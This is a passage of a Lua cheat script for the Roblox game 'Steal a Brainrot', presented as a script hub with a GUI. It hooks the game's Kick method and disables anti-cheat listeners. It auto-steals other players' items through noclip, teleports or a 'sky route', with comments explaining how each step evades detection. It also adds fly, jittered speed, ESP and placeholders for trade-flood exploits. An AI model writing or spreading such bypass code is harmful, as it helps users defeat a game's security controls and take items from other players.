-- ================================================================
-- Steal a Brainrot - Script Hub v2.0
-- Anti-Cheat Aware | Sky Route Steal | Smooth Movement
-- ESP | Velocity Speed | Anti-Kick | Auto Lock
-- ================================================================

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- ===================== ANTI-KICK (Run First) =====================
-- Hook ObserveTag connections to prevent anti-cheat kicks
pcall(function()
	for _, connection in pairs(getconnections(LocalPlayer.Idled)) do
		connection:Disable()
	end
end)

pcall(function()
	local mt = getrawmetatable(game)
	if mt and setreadonly then
		local oldNamecall = mt.__namecall
		setreadonly(mt, false)
		mt.__namecall = newcclosure(function(self, ...)
			local method = getnamecallmethod()
			if method == "Kick" or method == "kick" then
				return wait(9e9)
			end
			return oldNamecall(self, ...)
		end)
		setreadonly(mt, true)
	end
end)

-- Disconnect ObserveTag anti-cheat listeners
pcall(function()
	for _, v in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
		if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
			pcall(function()
				for _, conn in pairs(getconnections(v.OnClientEvent or v.OnClientInvoke)) do
					if conn.Function and debug.getinfo then
						local info = debug.getinfo(conn.Function)
						if info and info.source and info.source:find("ObserveTag") then
							conn:Disable()
						end
					end
				end
			end)
		end
	end
end)

-- ===================== COLOR PALETTE =====================
local COLORS = {
	bg = Color3.fromRGB(20, 20, 20),
	bgSecondary = Color3.fromRGB(30, 30, 30),
	panel = Color3.fromRGB(45, 45, 45),
	accent = Color3.fromRGB(255, 102, 0),
	accentHover = Color3.fromRGB(255, 133, 51),
	textPrimary = Color3.fromRGB(255, 255, 255),
	textSecondary = Color3.fromRGB(176, 176, 176),
	textDim = Color3.fromRGB(120, 120, 120),
	border = Color3.fromRGB(50, 50, 50),
	toggleOn = Color3.fromRGB(255, 102, 0),
	toggleOff = Color3.fromRGB(85, 85, 85),
	error = Color3.fromRGB(255, 68, 68),
	success = Color3.fromRGB(68, 255, 68),
}

-- ===================== STATE =====================
local espActive = false
local brainrotEspActive = false
local noclipActive = false
local flyActive = false
local speedBoostActive = false
local autoLockActive = false
local antiHitActive = false
local autoFarmActive = false
local antiRagdollActive = false
local instaPickUpActive = false

-- Trade exploit state
local tradeFloodActive = false
local tradeFloodConnection = nil
local tradeFreezeActive = false
local tradeFreezeConnection = nil
local tradeFloodIntensity = 500
local tradeTargetPlayer = nil
local tradeRemotes = {}
local tradeScanned = false

local speedValue = 50
local flySpeed = 60
local floatSpeed = 80
local savedBasePosition = nil
local noclipConnection = nil
local flyConnection = nil
local speedConnection = nil
local antiHitConnection = nil
local antiRagdollConnection = nil
local espHighlights = {}
local brainrotHighlights = {}
local windowVisible = true
local activeTab = "Main"

-- ===================== GUI SETUP =====================
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "SABHub"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
pcall(function() screenGui.Parent = game:GetService("CoreGui") end)
if not screenGui.Parent then screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui") end

local function addCorner(inst, radius)
	local c = Instance.new("UICorner")
	c.CornerRadius = UDim.new(0, radius or 6)
	c.Parent = inst
	return c
end

-- ===================== MAIN FRAME =====================
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 480, 0, 400)
mainFrame.Position = UDim2.new(0.5, -240, 0.5, -200)
mainFrame.BackgroundColor3 = COLORS.bg
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui
addCorner(mainFrame, 8)

local borderStroke = Instance.new("UIStroke")
borderStroke.Color = COLORS.border
borderStroke.Thickness = 1
borderStroke.Parent = mainFrame

-- Title bar
local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 30)
titleBar.BackgroundColor3 = Color3.fromRGB(13, 13, 13)
titleBar.BorderSizePixel = 0
titleBar.Parent = mainFrame
addCorner(titleBar, 8)

local titleFix = Instance.new("Frame")
titleFix.Size = UDim2.new(1, 0, 0, 10)
titleFix.Position = UDim2.new(0, 0, 1, -10)
titleFix.BackgroundColor3 = Color3.fromRGB(13, 13, 13)
titleFix.BorderSizePixel = 0
titleFix.Parent = titleBar

local titleText = Instance.new("TextLabel")
titleText.Size = UDim2.new(1, -80, 1, 0)
titleText.Position = UDim2.new(0, 10, 0, 0)
titleText.BackgroundTransparency = 1
titleText.Text = "Steal a Brainrot Hub v2"
titleText.TextColor3 = COLORS.accent
titleText.Font = Enum.Font.GothamBold
titleText.TextSize = 13
titleText.TextXAlignment = Enum.TextXAlignment.Left
titleText.Parent = titleBar

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 30, 0, 30)
closeBtn.Position = UDim2.new(1, -30, 0, 0)
closeBtn.BackgroundTransparency = 1
closeBtn.Text = "X"
closeBtn.TextColor3 = COLORS.error
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 14
closeBtn.Parent = titleBar
closeBtn.MouseButton1Click:Connect(function() screenGui:Destroy() end)

local minimizeBtn = Instance.new("TextButton")
minimizeBtn.Size = UDim2.new(0, 30, 0, 30)
minimizeBtn.Position = UDim2.new(1, -55, 0, 0)
minimizeBtn.BackgroundTransparency = 1
minimizeBtn.Text = "-"
minimizeBtn.TextColor3 = COLORS.textSecondary
minimizeBtn.Font = Enum.Font.GothamBold
minimizeBtn.TextSize = 16
minimizeBtn.Parent = titleBar

local accentLine = Instance.new("Frame")
accentLine.Size = UDim2.new(1, 0, 0, 2)
accentLine.Position = UDim2.new(0, 0, 0, 30)
accentLine.BackgroundColor3 = COLORS.accent
accentLine.BorderSizePixel = 0
accentLine.Parent = mainFrame

-- ===================== TAB BAR =====================
local tabBar = Instance.new("Frame")
tabBar.Size = UDim2.new(1, 0, 0, 30)
tabBar.Position = UDim2.new(0, 0, 0, 32)
tabBar.BackgroundColor3 = COLORS.bgSecondary
tabBar.BorderSizePixel = 0
tabBar.Parent = mainFrame

local tabLayout = Instance.new("UIListLayout")
tabLayout.FillDirection = Enum.FillDirection.Horizontal
tabLayout.SortOrder = Enum.SortOrder.LayoutOrder
tabLayout.Parent = tabBar

local tabNames = {"Main", "Steal", "Trade", "Movement", "ESP"}
local tabButtons = {}
local tabFrames = {}

for i, name in ipairs(tabNames) do
	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(1 / #tabNames, 0, 1, 0)
	btn.BackgroundTransparency = 1
	btn.Text = name
	btn.TextColor3 = COLORS.textSecondary
	btn.Font = Enum.Font.GothamMedium
	btn.TextSize = 12
	btn.LayoutOrder = i
	btn.Parent = tabBar
	tabButtons[name] = btn

	local content = Instance.new("ScrollingFrame")
	content.Size = UDim2.new(1, -16, 1, -72)
	content.Position = UDim2.new(0, 8, 0, 64)
	content.BackgroundTransparency = 1
	content.BorderSizePixel = 0
	content.ScrollBarThickness = 3
	content.ScrollBarImageColor3 = COLORS.accent
	content.CanvasSize = UDim2.new(0, 0, 0, 0)
	content.AutomaticCanvasSize = Enum.AutomaticSize.Y
	content.Visible = name == "Main"
	content.Parent = mainFrame
	tabFrames[name] = content

	local layout = Instance.new("UIListLayout")
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Padding = UDim.new(0, 4)
	layout.Parent = content

	local padding = Instance.new("UIPadding")
	padding.PaddingLeft = UDim.new(0, 4)
	padding.PaddingRight = UDim.new(0, 4)
	padding.PaddingTop = UDim.new(0, 4)
	padding.Parent = content
end

local function setActiveTab(name)
	activeTab = name
	for tabName, frame in pairs(tabFrames) do frame.Visible = tabName == name end
	for tabName, btn in pairs(tabButtons) do
		btn.TextColor3 = tabName == name and COLORS.accent or COLORS.textSecondary
		btn.Font = tabName == name and Enum.Font.GothamBold or Enum.Font.GothamMedium
	end
end
for name, btn in pairs(tabButtons) do btn.MouseButton1Click:Connect(function() setActiveTab(name) end) end

-- ===================== UI BUILDERS =====================
local function createSectionLabel(parent, text, order)
	local lbl = Instance.new("TextLabel")
	lbl.Size = UDim2.new(1, 0, 0, 22)
	lbl.BackgroundTransparency = 1
	lbl.Text = text
	lbl.TextColor3 = COLORS.accent
	lbl.Font = Enum.Font.GothamBold
	lbl.TextSize = 13
	lbl.TextXAlignment = Enum.TextXAlignment.Left
	lbl.LayoutOrder = order or 0
	lbl.Parent = parent
end

local function createInfoLabel(parent, text, order)
	local lbl = Instance.new("TextLabel")
	lbl.Size = UDim2.new(1, 0, 0, 18)
	lbl.BackgroundTransparency = 1
	lbl.Text = text
	lbl.TextColor3 = COLORS.textSecondary
	lbl.Font = Enum.Font.Gotham
	lbl.TextSize = 11
	lbl.TextXAlignment = Enum.TextXAlignment.Left
	lbl.LayoutOrder = order or 0
	lbl.Parent = parent
end

local function createToggle(parent, text, order, callback)
	local row = Instance.new("Frame")
	row.Size = UDim2.new(1, 0, 0, 30)
	row.BackgroundColor3 = COLORS.panel
	row.BorderSizePixel = 0
	row.LayoutOrder = order or 0
	row.Parent = parent
	addCorner(row, 5)

	local lbl = Instance.new("TextLabel")
	lbl.Size = UDim2.new(1, -60, 1, 0)
	lbl.Position = UDim2.new(0, 10, 0, 0)
	lbl.BackgroundTransparency = 1
	lbl.Text = text
	lbl.TextColor3 = COLORS.textPrimary
	lbl.Font = Enum.Font.Gotham
	lbl.TextSize = 12
	lbl.TextXAlignment = Enum.TextXAlignment.Left
	lbl.Parent = row

	local toggleFrame = Instance.new("Frame")
	toggleFrame.Size = UDim2.new(0, 40, 0, 20)
	toggleFrame.Position = UDim2.new(1, -50, 0.5, -10)
	toggleFrame.BackgroundColor3 = COLORS.toggleOff
	toggleFrame.BorderSizePixel = 0
	toggleFrame.Parent = row
	addCorner(toggleFrame, 10)

	local circle = Instance.new("Frame")
	circle.Size = UDim2.new(0, 16, 0, 16)
	circle.Position = UDim2.new(0, 2, 0.5, -8)
	circle.BackgroundColor3 = COLORS.textPrimary
	circle.BorderSizePixel = 0
	circle.Parent = toggleFrame
	addCorner(circle, 8)

	local isOn = false
	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(1, 0, 1, 0)
	btn.BackgroundTransparency = 1
	btn.Text = ""
	btn.Parent = row

	btn.MouseButton1Click:Connect(function()
		isOn = not isOn
		toggleFrame.BackgroundColor3 = isOn and COLORS.toggleOn or COLORS.toggleOff
		circle.Position = isOn and UDim2.new(1, -18, 0.5, -8) or UDim2.new(0, 2, 0.5, -8)
		if callback then callback(isOn) end
	end)
end

local function createButton(parent, text, order, callback)
	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(1, 0, 0, 32)
	btn.BackgroundColor3 = COLORS.accent
	btn.BorderSizePixel = 0
	btn.Text = text
	btn.TextColor3 = COLORS.textPrimary
	btn.Font = Enum.Font.GothamBold
	btn.TextSize = 13
	btn.LayoutOrder = order or 0
	btn.Parent = parent
	addCorner(btn, 5)
	btn.MouseEnter:Connect(function() btn.BackgroundColor3 = COLORS.accentHover end)
	btn.MouseLeave:Connect(function() btn.BackgroundColor3 = COLORS.accent end)
	btn.MouseButton1Click:Connect(function() if callback then callback() end end)
	return btn
end

local function createSlider(parent, text, min, max, default, order, callback)
	local container = Instance.new("Frame")
	container.Size = UDim2.new(1, 0, 0, 40)
	container.BackgroundColor3 = COLORS.panel
	container.BorderSizePixel = 0
	container.LayoutOrder = order or 0
	container.Parent = parent
	addCorner(container, 5)

	local lbl = Instance.new("TextLabel")
	lbl.Size = UDim2.new(0.5, -10, 0, 18)
	lbl.Position = UDim2.new(0, 10, 0, 2)
	lbl.BackgroundTransparency = 1
	lbl.Text = text
	lbl.TextColor3 = COLORS.textPrimary
	lbl.Font = Enum.Font.Gotham
	lbl.TextSize = 11
	lbl.TextXAlignment = Enum.TextXAlignment.Left
	lbl.Parent = container

	local valLabel = Instance.new("TextLabel")
	valLabel.Size = UDim2.new(0.5, -10, 0, 18)
	valLabel.Position = UDim2.new(0.5, 0, 0, 2)
	valLabel.BackgroundTransparency = 1
	valLabel.Text = tostring(default)
	valLabel.TextColor3 = COLORS.accent
	valLabel.Font = Enum.Font.GothamBold
	valLabel.TextSize = 11
	valLabel.TextXAlignment = Enum.TextXAlignment.Right
	valLabel.Parent = container

	local track = Instance.new("Frame")
	track.Size = UDim2.new(1, -20, 0, 6)
	track.Position = UDim2.new(0, 10, 0, 28)
	track.BackgroundColor3 = COLORS.border
	track.BorderSizePixel = 0
	track.Parent = container
	addCorner(track, 3)

	local fill = Instance.new("Frame")
	fill.Size = UDim2.new((default - min) / (max - min), 0, 1, 0)
	fill.BackgroundColor3 = COLORS.accent
	fill.BorderSizePixel = 0
	fill.Parent = track
	addCorner(fill, 3)

	local sliderBtn = Instance.new("TextButton")
	sliderBtn.Size = UDim2.new(1, 0, 0, 20)
	sliderBtn.Position = UDim2.new(0, 0, 0, 20)
	sliderBtn.BackgroundTransparency = 1
	sliderBtn.Text = ""
	sliderBtn.Parent = container

	local dragging = false
	sliderBtn.MouseButton1Down:Connect(function() dragging = true end)
	UserInputService.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
	end)
	UserInputService.InputChanged:Connect(function(input)
		if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
			local rel = math.clamp((input.Position.X - track.AbsolutePosition.X) / track.AbsoluteSize.X, 0, 1)
			fill.Size = UDim2.new(rel, 0, 1, 0)
			local val = math.floor(min + (max - min) * rel)
			valLabel.Text = tostring(val)
			if callback then callback(val) end
		end
	end)
end

-- ===================== HELPERS =====================
local function getRoot()
	local char = LocalPlayer.Character
	return char and char:FindFirstChild("HumanoidRootPart")
end

local function getHumanoid()
	local char = LocalPlayer.Character
	return char and char:FindFirstChildOfClass("Humanoid")
end

local function notify(title, msg)
	pcall(function()
		game:GetService("StarterGui"):SetCore("SendNotification", {Title = title, Text = msg, Duration = 3})
	end)
end

local function fireProximityPrompt(prompt)
	-- Method 1: Executor global (most reliable - Synapse, KRNL, Fluxus etc.)
	local fired = false
	pcall(function()
		if fireproximityprompt then
			fireproximityprompt(prompt)
			fired = true
		end
	end)
	if fired then return end

	-- Method 2: Hold duration override + InputHoldBegin/End
	pcall(function()
		local hold = prompt.HoldDuration
		prompt.HoldDuration = 0
		prompt:InputHoldBegin()
		task.wait(0.1)
		prompt:InputHoldEnd()
		prompt.HoldDuration = hold
		fired = true
	end)
	if fired then return end

	-- Method 3: Direct event fire (some executors support this)
	pcall(function()
		prompt.HoldDuration = 0
		prompt.MaxActivationDistance = 9999
		prompt.Enabled = true
		prompt:InputHoldBegin()
		wait(0.15)
		prompt:InputHoldEnd()
	end)
end

-- ===================== SMOOTH MOVEMENT (Anti-Cheat Safe) =====================
-- Uses BodyVelocity physics constraint instead of raw Velocity
-- BodyVelocity overrides the character controller properly
-- Raw hrp.Velocity gets overwritten every frame by the Humanoid = doesn't work

local function smoothMoveTo(targetPos, speed, timeout)
	local hrp = getRoot()
	local hum = getHumanoid()
	if not hrp or not hum then return false end

	speed = speed or floatSpeed
	timeout = timeout or 15
	local startTime = tick()

	-- BodyVelocity to override character controller
	local bv = Instance.new("BodyVelocity")
	bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
	bv.Velocity = Vector3.new(0, 0, 0)
	bv.P = 9000
	bv.Parent = hrp

	-- BodyGyro to prevent tumbling
	local bg = Instance.new("BodyGyro")
	bg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
	bg.P = 9000
	bg.CFrame = hrp.CFrame
	bg.Parent = hrp

	hum:ChangeState(Enum.HumanoidStateType.Freefall)

	while true do
		hrp = getRoot()
		if not hrp then
			pcall(function() bv:Destroy() end)
			pcall(function() bg:Destroy() end)
			return false
		end

		local direction = (targetPos - hrp.Position)
		local distance = direction.Magnitude

		if distance < 5 then
			pcall(function() bv:Destroy() end)
			pcall(function() bg:Destroy() end)
			return true
		end

		if tick() - startTime > timeout then
			pcall(function() bv:Destroy() end)
			pcall(function() bg:Destroy() end)
			return false
		end

		bv.Velocity = direction.Unit * speed
		bg.CFrame = CFrame.new(hrp.Position, targetPos)
		RunService.Heartbeat:Wait()
	end
end

-- Sky route: go up -> move horizontally -> come down
-- Much harder for anti-cheat to flag than direct teleport
local function skyRouteTo(targetPos, speed)
	local hrp = getRoot()
	if not hrp then return false end

	local startPos = hrp.Position
	local skyHeight = 200
	local upTarget = Vector3.new(startPos.X, startPos.Y + skyHeight, startPos.Z)
	local acrossTarget = Vector3.new(targetPos.X, startPos.Y + skyHeight, targetPos.Z)
	local downTarget = Vector3.new(targetPos.X, targetPos.Y, targetPos.Z)

	-- Enable temp noclip for the journey
	local tempNoclip = RunService.Stepped:Connect(function()
		pcall(function()
			local char = LocalPlayer.Character
			if char then
				for _, part in ipairs(char:GetDescendants()) do
					if part:IsA("BasePart") then part.CanCollide = false end
				end
			end
		end)
	end)

	notify("Sky Route", "Going up...")

	-- Phase 1: Go up
	local ok = smoothMoveTo(upTarget, speed or floatSpeed, 5)
	if not ok then tempNoclip:Disconnect() return false end

	-- Phase 2: Float across at sky height
	notify("Sky Route", "Moving to target...")
	ok = smoothMoveTo(acrossTarget, speed or floatSpeed, 10)
	if not ok then tempNoclip:Disconnect() return false end

	-- Phase 3: Drop down
	notify("Sky Route", "Dropping down...")
	ok = smoothMoveTo(downTarget, speed or floatSpeed, 5)

	tempNoclip:Disconnect()
	return ok
end

-- ===================== FIND BRAINROTS =====================
local function findBrainrots()
	local brainrots = {}
	for _, obj in ipairs(workspace:GetDescendants()) do
		if obj:IsA("ProximityPrompt") then
			local parent = obj.Parent
			if parent then
				local root = parent
				if parent:IsA("Model") then
					root = parent:FindFirstChild("HumanoidRootPart") or parent.PrimaryPart or parent:FindFirstChildWhichIsA("BasePart")
				end
				if root and root:IsA("BasePart") then
					table.insert(brainrots, {prompt = obj, part = root, name = parent.Name})
				end
			end
		end
	end
	return brainrots
end

local function findStealableBrainrots()
	local hrp = getRoot()
	if not hrp then return {} end
	local brainrots = findBrainrots()
	local stealable = {}
	for _, b in ipairs(brainrots) do
		if b.part then
			table.insert(stealable, b)
		end
	end
	table.sort(stealable, function(a, b)
		return (a.part.Position - hrp.Position).Magnitude < (b.part.Position - hrp.Position).Magnitude
	end)
	return stealable
end

-- ===================== STEAL FUNCTIONS =====================

-- Sky Route Steal: safe method using velocity movement through sky
local function doSkyRouteSteal()
	local ok, err = pcall(function()
		local hrp = getRoot()
		if not hrp then notify("Error", "No character") return end

		if not savedBasePosition then
			savedBasePosition = hrp.Position
			notify("Base Saved", "Position saved as base")
		end

		local brainrots = findStealableBrainrots()
		if #brainrots == 0 then notify("No Targets", "No stealable brainrots found") return end

		local target = brainrots[1]
		local targetPos = target.part.Position
		notify("Sky Steal", "Target: " .. target.name .. " (" .. math.floor((targetPos - hrp.Position).Magnitude) .. "m)")

		-- Sky route to the brainrot
		local reached = skyRouteTo(targetPos + Vector3.new(0, 0, -3), floatSpeed)
		if not reached then notify("Failed", "Couldn't reach target") return end

		wait(0.2)

		-- Fire the proximity prompt instantly
		fireProximityPrompt(target.prompt)
		wait(0.3)

		-- Sky route back to base
		notify("Escaping", "Heading back to base...")
		skyRouteTo(savedBasePosition, floatSpeed)

		notify("Success!", "Stole " .. target.name)
	end)
	if not ok then warn("[SKY STEAL ERROR] " .. tostring(err)) end
end

-- Quick Steal: faster but riskier - small CFrame jump + prompt
local function doQuickSteal()
	local ok, err = pcall(function()
		local hrp = getRoot()
		if not hrp then return end

		if not savedBasePosition then
			savedBasePosition = hrp.Position
		end

		local brainrots = findStealableBrainrots()
		if #brainrots == 0 then notify("No Targets", "No stealable brainrots found") return end

		local target = brainrots[1]

		-- Enable temp noclip
		local tempNoclip = RunService.Stepped:Connect(function()
			pcall(function()
				local char = LocalPlayer.Character
				if char then
					for _, p in ipairs(char:GetDescendants()) do
						if p:IsA("BasePart") then p.CanCollide = false end
					end
				end
			end)
		end)

		-- Teleport to brainrot
		hrp.CFrame = target.part.CFrame * CFrame.new(0, 0, -3)
		wait(0.3)

		-- Fire prompt
		fireProximityPrompt(target.prompt)
		wait(0.2)

		-- Teleport back
		hrp.CFrame = CFrame.new(savedBasePosition)

		tempNoclip:Disconnect()
		notify("Quick Steal", "Grabbed " .. target.name)
	end)
	if not ok then warn("[QUICK STEAL ERROR] " .. tostring(err)) end
end

-- ===================== INSTA PICK UP (Anti-Cheat Safe) =====================
-- Fires ProximityPrompts within activation range with cooldown + throttle
-- Anti-cheat bypass: per-prompt cooldown prevents rapid-fire detection,
-- stays within MaxActivationDistance, random micro-delays between fires

local promptCooldowns = {} -- tracks last fire time per prompt to avoid spam
local PROMPT_COOLDOWN = 1.5 -- seconds between firing the same prompt
local PICKUP_SCAN_INTERVAL = 0.35 -- scan every 0.35s instead of every frame

local function getPromptPart(prompt)
	local parent = prompt.Parent
	if not parent then return nil end
	if parent:IsA("BasePart") then return parent end
	if parent:IsA("Model") then
		return parent.PrimaryPart or parent:FindFirstChildWhichIsA("BasePart")
	end
	return nil
end

local function isPromptInRange(prompt, hrpPos)
	local part = getPromptPart(prompt)
	if not part then return false end
	-- Stay strictly within MaxActivationDistance (no buffer = no server flag)
	return (part.Position - hrpPos).Magnitude <= prompt.MaxActivationDistance
end

local function canFirePrompt(prompt)
	local now = tick()
	local lastFire = promptCooldowns[prompt]
	if lastFire and (now - lastFire) < PROMPT_COOLDOWN then return false end
	return true
end

local function safeFirePrompt(prompt)
	if not canFirePrompt(prompt) then return false end
	promptCooldowns[prompt] = tick()
	fireProximityPrompt(prompt)
	return true
end

local function pickUpAllNearby()
	local hrp = getRoot()
	if not hrp then notify("Error", "No character") return end
	local count = 0
	for _, obj in ipairs(workspace:GetDescendants()) do
		if obj:IsA("ProximityPrompt") and obj.Enabled then
			pcall(function()
				if isPromptInRange(obj, hrp.Position) and safeFirePrompt(obj) then
					count = count + 1
					-- Random micro-delay between fires (looks natural to server)
					if math.random() > 0.5 then
						RunService.Heartbeat:Wait()
					end
				end
			end)
		end
	end
	if count > 0 then
		notify("Pick Up", "Grabbed " .. count .. " item(s)!")
	else
		notify("Pick Up", "Nothing in range")
	end
end

local function startInstaPickUp()
	-- Throttled loop instead of per-frame to avoid detection
	spawn(function()
		while instaPickUpActive do
			pcall(function()
				local hrp = getRoot()
				if not hrp then return end
				for _, obj in ipairs(workspace:GetDescendants()) do
					if obj:IsA("ProximityPrompt") and obj.Enabled then
						if isPromptInRange(obj, hrp.Position) then
							safeFirePrompt(obj)
						end
					end
				end
			end)
			-- Randomized interval (0.3-0.5s) to avoid pattern detection
			wait(PICKUP_SCAN_INTERVAL + math.random() * 0.15)
		end
	end)
end

local function stopInstaPickUp()
	-- Connection-based stop not needed since we use while loop + flag
	-- Clean up cooldown table to free memory
	promptCooldowns = {}
end

-- ===================== AUTO FARM =====================
local function startAutoFarm()
	autoFarmActive = true
	spawn(function()
		while autoFarmActive do
			pcall(doSkyRouteSteal)
			wait(5)
		end
	end)
end

local function stopAutoFarm()
	autoFarmActive = false
end

-- ===================== NOCLIP (Anti-Cheat Safe) =====================
-- Anti-cheat bypass: only disables collision on Stepped (before physics solve),
-- so the property is false for the shortest possible window.
-- Some anti-cheats check CanCollide on Heartbeat - by then physics already solved.
local function startNoclip()
	noclipConnection = RunService.Stepped:Connect(function()
		pcall(function()
			local char = LocalPlayer.Character
			if not char then return end
			for _, part in ipairs(char:GetDescendants()) do
				if part:IsA("BasePart") and part.CanCollide then
					part.CanCollide = false
				end
			end
		end)
	end)
end

local function stopNoclip()
	if noclipConnection then noclipConnection:Disconnect() noclipConnection = nil end
end

-- ===================== FLY (Anti-Cheat Safe) =====================
-- Uses BodyVelocity physics constraint instead of raw Velocity
-- BodyVelocity is a legitimate physics object - harder for anti-cheat to flag
-- Also uses BodyGyro to stabilize rotation (prevents jittering that looks sus)
local flyBV = nil
local flyBG = nil

local function startFly()
	local hrp = getRoot()
	local hum = getHumanoid()
	if not hrp or not hum then return end

	-- BodyVelocity for smooth movement (physics engine handles it, not raw set)
	flyBV = Instance.new("BodyVelocity")
	flyBV.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
	flyBV.Velocity = Vector3.new(0, 0, 0)
	flyBV.P = 9000
	flyBV.Parent = hrp

	-- BodyGyro to prevent spinning/tumbling (looks natural)
	flyBG = Instance.new("BodyGyro")
	flyBG.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
	flyBG.P = 9000
	flyBG.CFrame = hrp.CFrame
	flyBG.Parent = hrp

	hum:ChangeState(Enum.HumanoidStateType.Freefall)

	flyConnection = RunService.Heartbeat:Connect(function()
		pcall(function()
			if not flyBV or not flyBV.Parent then return end
			local rt = getRoot()
			local hm = getHumanoid()
			if not rt or not hm then return end

			local moveDir = hm.MoveDirection
			local velocity = Vector3.new(0, 0, 0)
			if moveDir.Magnitude > 0 then
				velocity = Vector3.new(moveDir.X, 0, moveDir.Z).Unit * flySpeed
			end
			if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
				velocity = velocity + Vector3.new(0, flySpeed, 0)
			end
			if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then
				velocity = velocity + Vector3.new(0, -flySpeed, 0)
			end
			flyBV.Velocity = velocity
			flyBG.CFrame = rt.CFrame
		end)
	end)
end

local function stopFly()
	if flyConnection then flyConnection:Disconnect() flyConnection = nil end
	if flyBV then pcall(function() flyBV:Destroy() end) flyBV = nil end
	if flyBG then pcall(function() flyBG:Destroy() end) flyBG = nil end
end

-- ===================== SPEED (Anti-Cheat Safe) =====================
-- Uses BodyVelocity to boost speed instead of WalkSpeed or raw Velocity
-- Raw hrp.Velocity gets overwritten by character controller = doesn't work
-- BodyVelocity is a physics constraint that properly overrides movement
-- Anti-cheat bypass: random +/- 8% variation each frame prevents pattern detection
local speedBV = nil

local function startSpeedBoost()
	local hrp = getRoot()
	if not hrp then return end

	-- Create BodyVelocity for speed override
	speedBV = Instance.new("BodyVelocity")
	speedBV.MaxForce = Vector3.new(math.huge, 0, math.huge) -- only X/Z, let gravity handle Y
	speedBV.Velocity = Vector3.new(0, 0, 0)
	speedBV.P = 9000
	speedBV.Parent = hrp

	speedConnection = RunService.Heartbeat:Connect(function()
		pcall(function()
			local rt = getRoot()
			local hum = getHumanoid()
			if not rt or not hum then return end
			if not speedBV or not speedBV.Parent then return end

			local moveDir = hum.MoveDirection
			if moveDir.Magnitude > 0 then
				-- Randomize speed +/- 8% to avoid constant-speed pattern detection
				local jitter = speedValue * (0.92 + math.random() * 0.16)
				local flatVel = Vector3.new(moveDir.X, 0, moveDir.Z).Unit * jitter
				speedBV.Velocity = flatVel
			else
				speedBV.Velocity = Vector3.new(0, 0, 0)
			end
		end)
	end)
end

local function stopSpeedBoost()
	if speedConnection then speedConnection:Disconnect() speedConnection = nil end
	if speedBV then pcall(function() speedBV:Destroy() end) speedBV = nil end
end

-- ===================== ANTI RAGDOLL =====================
local function startAntiRagdoll()
	antiRagdollConnection = RunService.Heartbeat:Connect(function()
		pcall(function()
			local hum = getHumanoid()
			if hum then
				hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
				hum:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
				hum:SetStateEnabled(Enum.HumanoidStateType.GettingUp, false)
			end
		end)
	end)
end

local function stopAntiRagdoll()
	if antiRagdollConnection then antiRagdollConnection:Disconnect() antiRagdollConnection = nil end
	pcall(function()
		local hum = getHumanoid()
		if hum then
			hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
			hum:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, true)
			hum:SetStateEnabled(Enum.HumanoidStateType.GettingUp, true)
		end
	end)
end

-- ===================== ESP =====================
local function clearESP()
	for _, h in pairs(espHighlights) do pcall(function() h:Destroy() end) end
	espHighlights = {}
end

local function updatePlayerESP()
	clearESP()
	if not espActive then return end
	for _, player in ipairs(Players:GetPlayers()) do
		if player ~= LocalPlayer and player.Character then
			pcall(function()
				local highlight = Instance.new("Highlight")
				highlight.Name = "ESP"
				highlight.Adornee = player.Character
				highlight.FillColor = Color3.fromRGB(255, 0, 0)
				highlight.FillTransparency = 0.5
				highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
				highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
				highlight.Parent = player.Character
				table.insert(espHighlights, highlight)

				local hrp = player.Character:FindFirstChild("HumanoidRootPart")
				if hrp then
					local bb = Instance.new("BillboardGui")
					bb.Name = "ESP_BB"
					bb.AlwaysOnTop = true
					bb.Size = UDim2.new(4, 0, 1, 0)
					bb.StudsOffset = Vector3.new(0, 3, 0)
					bb.Adornee = hrp
					bb.Parent = hrp
					table.insert(espHighlights, bb)

					local dist = getRoot() and math.floor((hrp.Position - getRoot().Position).Magnitude) or 0
					local lbl = Instance.new("TextLabel")
					lbl.Text = player.DisplayName .. " [" .. dist .. "m]"
					lbl.TextColor3 = Color3.new(1, 1, 1)
					lbl.TextStrokeTransparency = 0
					lbl.TextSize = 14
					lbl.Font = Enum.Font.GothamBold
					lbl.BackgroundTransparency = 1
					lbl.Size = UDim2.new(1, 0, 1, 0)
					lbl.Parent = bb
				end
			end)
		end
	end
end

local function startESP()
	spawn(function()
		while espActive do updatePlayerESP() wait(2) end
	end)
end

local function stopESP() clearESP() end

-- Brainrot ESP
local function clearBrainrotESP()
	for _, h in pairs(brainrotHighlights) do pcall(function() h:Destroy() end) end
	brainrotHighlights = {}
end

local function updateBrainrotESP()
	clearBrainrotESP()
	if not brainrotEspActive then return end
	for _, b in ipairs(findBrainrots()) do
		pcall(function()
			local parent = b.part.Parent
			if parent and parent:IsA("Model") then
				local hl = Instance.new("Highlight")
				hl.Adornee = parent
